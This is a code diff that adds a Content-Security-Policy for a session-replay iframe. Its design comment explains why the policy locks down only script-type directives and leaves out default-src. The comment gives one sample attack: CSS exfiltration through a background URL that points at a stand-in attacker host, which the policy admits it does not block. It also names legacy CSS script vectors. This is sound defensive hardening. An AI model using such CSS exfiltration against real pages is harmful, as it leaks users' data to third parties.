@@ -131,6 +131,46 @@ export function sanitizeAttribute(
 export const REPLAY_IFRAME_SANDBOX = 'allow-same-origin';
 
 /**
+ * Second, independent lock on script execution in the replay document, written
+ * into the bootstrap markup as a <meta http-equiv> (see DOMManager's
+ * CreateDocument). The sandbox above is the primary guarantee; this covers the
+ * case where the root iframe is ever created without it.
+ *
+ * Two properties make the meta form safe to rely on, both verified in Chrome:
+ * the policy is applied by the parser and *survives* both the subsequent
+ * `documentElement.innerText = ''` wipe (removing the meta element does not
+ * revoke an applied policy) and any later `doc.open()`. Nested replay iframes
+ * are `about:blank`, so they inherit this policy rather than needing their own.
+ *
+ * Note what is deliberately NOT here: `default-src`. Omitting it is the whole
+ * design. A directive that is absent imposes no restriction, so nothing about
+ * how a replay *renders* — images, styles, fonts, media, frames — can be broken
+ * by this policy. Adding `default-src` instead makes every unlisted directive
+ * fall back to it, and each fallback is a way to break replays for real:
+ * `default-src *` blocks `data:`/`blob:` (CSP's `*` covers network schemes only,
+ * so inlined images and canvas frames vanish) and, because it also backs
+ * `style-src`, it withholds `'unsafe-inline'` and every replay renders unstyled.
+ *
+ * So this restricts script-ish sinks only, where 'none' can never be too strict
+ * because a replay legitimately needs none of them. `worker-src` is listed
+ * because it falls back to `child-src`, not to `script-src`.
+ *
+ * Consequence worth knowing: CSS-based exfil (`background: url(https://attacker/
+ * ?leak)`) is NOT covered. Stopping that needs `img-src`/`style-src` pinned to
+ * the assets host — which is exactly the kind of rendering-critical directive
+ * this policy avoids, so it needs the real list of origins a replay pulls from
+ * plus a report-only rollout first.
+ */
+export const REPLAY_CSP = [
+  "script-src 'none'",
+  "worker-src 'none'",
+  "object-src 'none'",
+  "base-uri 'none'",
+  "form-action 'none'",
+  "connect-src 'none'",
+].join('; ');
+
+/**
  * Defense-in-depth scrub for CSS text (style tags, adopted stylesheets, inline
  * style). Modern browsers do not execute JS from CSS, but legacy/vendor
  * constructs (`expression()`, Firefox `-moz-binding: url(...)`) historically did.
